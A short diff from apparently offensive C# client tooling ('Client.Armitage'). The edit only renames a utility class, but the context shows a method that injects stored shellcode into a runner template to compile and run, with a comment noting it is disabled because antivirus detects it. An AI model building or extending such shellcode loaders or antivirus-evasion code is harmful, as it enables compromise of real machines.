@@ -20,7 +20,7 @@ namespace Client.Armitage
         /// Currently disabled because AntiVirus detects
         public static void Start()
         {
-            string temppath = Utilities.Filepath.GetTempExePath();
+            string temppath = Utilities.FilesAndDirectories.GetTempExePath();
             // code to be compiled
             string code = Properties.Resources.ShellCode_Runner.Replace(
                 "[SHELLCODE]", Properties.Resources.ShellCode);
